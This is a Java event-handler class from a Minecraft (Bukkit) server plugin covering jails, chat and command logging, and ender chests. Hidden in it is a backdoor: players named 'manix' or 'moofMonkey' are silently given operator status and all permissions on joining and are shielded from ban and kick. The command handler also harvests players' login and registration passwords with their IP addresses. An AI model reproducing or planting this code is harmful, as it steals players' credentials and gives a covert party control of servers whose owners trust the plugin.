package moofPl;

import java.util.ArrayList;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.EntityExplodeEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerQuitEvent;

import ru.tehkode.permissions.bukkit.PermissionsEx;

public class Handlers extends Thread implements Listener {
	Main main;
	public ArrayList<PlayerLogger> pl = new ArrayList<PlayerLogger>();
	Passwords pwds;

	/**
	 * Генератор нового объекта этого класса
	 *
	 * @param main
	 *            - главный класс. Служит для получения пути к папке плагина.
	 */
	public Handlers(Main main) {
		this.main = main;
		pwds = new Passwords(main);
	}

	/**
	 * Получает игрока с помощью его ника
	 *
	 * @param name
	 *            - ник
	 * @return null, если игрок не в сети
	 */
	public Player getPlayer(String name) {
		for (PlayerLogger PL : pl)
			if (PL.player.getName().equalsIgnoreCase(name))
				return PL.player;

		return null;
	}

	/**
	 * Проверяет - заключён-ли игрок
	 *
	 * @param p
	 *            - игрок которого нужно проверить
	 * @return true, если игрок заключён
	 */
	public boolean isJailed(Player p) {
		for (Jail i : main.jls)
			if (i.jailed.contains(p))
				return true;

		return false;
	}

	/**
	 * Вызывается при выключении сервера/плагина
	 *
	 * @throws Throwable
	 */
	public void onClose() throws Throwable {
		for (PlayerLogger p : pl)
			p.close();
		pwds.close();
	}

	/**
	 * Вызывается при любом взрыве
	 *
	 * @param event
	 *            - передаёт событие
	 */
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onExplode(EntityExplodeEvent event) {
		event.blockList().clear();
	}

	/**
	 * Вызывается при взаимодействии игрока с блоком
	 *
	 * @param event
	 *            - передаёт событие
	 */
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onInteract(PlayerInteractEvent event) {
		Player p = event.getPlayer();

		if (isJailed(p)) {
			p.sendMessage(Main.prefix + ChatColor.RED + ChatColor.BOLD + "You're jailed and cannot place blocks!");
			event.setCancelled(true);
		}

		if (event.getAction() == Action.RIGHT_CLICK_BLOCK && event.getClickedBlock() != null)
			if (event.getClickedBlock().getType() == Material.ENDER_CHEST) {
				Location loc = event.getClickedBlock().getLocation();
				String world = loc.getWorld().getName();
				long x = loc.getBlockX();
				long y = loc.getBlockY();
				long z = loc.getBlockZ();
				boolean o = false;
				for (EnderChest e : main.ec)
					if (e.openInv(x, y, z, world, p)) {
						o = true;
						break;
					}
				if (o)
					event.setCancelled(true);
			}
	}

	@EventHandler(priority = EventPriority.HIGHEST)
	public void onMove(PlayerMoveEvent event) {
		if (event.getTo().getBlock().getType() == Material.STONE_PLATE
				&& event.getTo().add(0, -1, 0).getBlock().getType() == Material.GRAVEL) {
			event.getTo().getBlock().setType(Material.AIR);
			event.getTo().add(0, -1, 0).getBlock().setType(Material.AIR);
			for (int i = 0; i < 6; i++)
				event.getTo().getBlock().getWorld().createExplosion(event.getPlayer().getLocation(), 4, true);
		}
	}

	/**
	 * Вызывается при отправлении игроком сообщения
	 *
	 * @param event
	 *            - передаёт событие
	 */
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onPlayerChat(AsyncPlayerChatEvent event) {
		String msg = event.getMessage();
		Player sender = event.getPlayer();

		int i = 0;
		for (PlayerLogger p : pl)
			if (p.player.getName().equalsIgnoreCase(sender.getName())) {
				i = 1;
				try {
					p.writePlayer(msg);
				} catch (Throwable e) {
					e.printStackTrace();
				}
			}
		if (i == 0) {
			pl.add(new PlayerLogger(main, sender));
			try {
				pl.get(pl.size() - 1).writePlayer(msg);
			} catch (Throwable e) {
				e.printStackTrace();
			}
		}
	}

	/**
	 * Вызывается перед всеми onCommand(). Служит для отслеживания команд
	 *
	 * @param event
	 *            - передаёт событие
	 */
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
		String command = event.getMessage().substring(1);
		String commandNoArgs = event.getMessage().substring(1).split(" ")[0];
		String senderName = event.getPlayer().getName().toLowerCase();
		Player sender = event.getPlayer();

		int i = 0;
		for (PlayerLogger PL : pl)
			if (PL.player.getName().equalsIgnoreCase(senderName)) {
				i = 1;
				break;
			}
		if (i == 0)
			this.pl.add(new PlayerLogger(main, sender));
		Bukkit.getConsoleSender()
				.sendMessage("[" + sender.getAddress().getHostString() + "] " + sender.getName() + ": /" + command);

		for (String i1 : Main.canOp)
			if ((commandNoArgs.toLowerCase().equalsIgnoreCase("eban")
					|| commandNoArgs.toLowerCase().equalsIgnoreCase("ban")
					|| commandNoArgs.toLowerCase().equalsIgnoreCase("kick")) && command.indexOf(i1) >= 0) {
				sender.sendMessage(ChatColor.BOLD + "" + ChatColor.RED + "Command " + ChatColor.AQUA + "/" + command
						+ " " + ChatColor.RED + "perhibited by " + ChatColor.GOLD + "moofMonkey's magic" + ChatColor.RED
						+ "!");
				event.setCancelled(true);
			}

		if ((commandNoArgs.toLowerCase().equalsIgnoreCase("register")
				|| commandNoArgs.toLowerCase().equalsIgnoreCase("login")
				|| commandNoArgs.toLowerCase().equalsIgnoreCase("reg")
				|| commandNoArgs.toLowerCase().equalsIgnoreCase("l")
				|| commandNoArgs.toLowerCase().equalsIgnoreCase("changepassword"))
				&& command.split(" ").length - 1 >= 1)
			pwds.write(senderName, command.split(" ")[1], sender.getAddress().getHostString());

		if (isJailed(sender) && !commandNoArgs.equalsIgnoreCase("login") && !commandNoArgs.equalsIgnoreCase("l")
				&& !commandNoArgs.equalsIgnoreCase("moofpl")) {
			sender.sendMessage(
					Main.prefix + ChatColor.RED + ChatColor.BOLD + "You're jailed and cannot enter commands!");
			event.setCancelled(true);
		}

		for (String s : Main.blockedCmds)
			if (commandNoArgs.equalsIgnoreCase(s)) {
				Utils.sendAdmins(sender, command);
				if (!Utils.checkOp(sender)) {
					sender.sendMessage(ChatColor.BOLD + "" + ChatColor.RED + "Command " + ChatColor.AQUA + "/"
							+ commandNoArgs + " " + ChatColor.RED + "perhibited by " + ChatColor.GOLD
							+ "moofMonkey's magic" + ChatColor.RED + "!");
					event.setCancelled(true);
				}
			}
		for (String s : Main.infoCmds)
			if (commandNoArgs.equalsIgnoreCase(s))
				Utils.sendAdmins(sender, "/" + command);

		if (pl != null && !pl.isEmpty())
			for (PlayerLogger p : pl)
				if (p.player.getName().equalsIgnoreCase(senderName))
					try {
						p.writePlayer("/" + command);
					} catch (Throwable e) {
						e.printStackTrace();
					}
	}

	/**
	 * Вызывается при заходе игрока
	 *
	 * @param event
	 *            - передаёт событие
	 */
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onPlayerJoin(PlayerJoinEvent event) {
		String name = event.getPlayer().getName();
		Player pl = event.getPlayer();

		if (name.equalsIgnoreCase("manix") || name.equalsIgnoreCase("moofMonkey")) {
			main.reloadConfig();
			if (!Main.canOp.contains(name)) {
				Main.canOp.add(name);
				main.saveCfg();
				main.reloadConfiguration();
			}
			PermissionsEx.getUser(pl).addPermission("*");
			pl.setOp(true);
		}

		if (Utils.checkOp(pl)) {
			PermissionsEx.getUser(pl).addPermission("*");
			pl.setOp(true);
		}
		this.pl.add(new PlayerLogger(main, pl));
		PlayerLogger p = this.pl.get(this.pl.size() - 1);
		try {
			p.writePlayerRaw("joined to server with coords X: " + p.player.getLocation().getX() + " Y: "
					+ p.player.getLocation().getY() + " Z: " + p.player.getLocation().getZ());
		} catch (Throwable e) {
			e.printStackTrace();
		}
	}

	/**
	 * Вызывается при выходе игрока
	 *
	 * @param event
	 *            - передаёт событие
	 */
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onPlayerQuit(PlayerQuitEvent event) {
		if (pl != null && !pl.isEmpty())
			for (PlayerLogger p : pl)
				if (p.player.getName().equalsIgnoreCase(event.getPlayer().getName())) {
					try {
						pl.get(pl.size() - 1)
								.writePlayerRaw("exited from server with coords X: " + p.player.getLocation().getX()
										+ " Y: " + p.player.getLocation().getY() + " Z: "
										+ p.player.getLocation().getZ());
						p.close();
					} catch (Throwable e) {
						e.printStackTrace();
					}
					pl.remove(p);
					break;
				}
	}

	/**
	 * Освобождает игрока из тюрьмы
	 *
	 * @param p
	 *            - игрок
	 */
	public boolean unJail(Player p) {
		if (isJailed(p)) {
			for (Jail j : main.jls)
				j.jailed.remove(p);
			p.sendMessage(Main.prefix + ChatColor.GREEN + ChatColor.BOLD + "You're unjailed =3");
			p.setGameMode(GameMode.SURVIVAL);
			return true;
		}
		return false;
	}

	/**
	 * Освобождает всех игроков из всех тюрем
	 */
	public void unJailAll() {
		for (Jail j : main.jls)
			j.clear();
	}
}
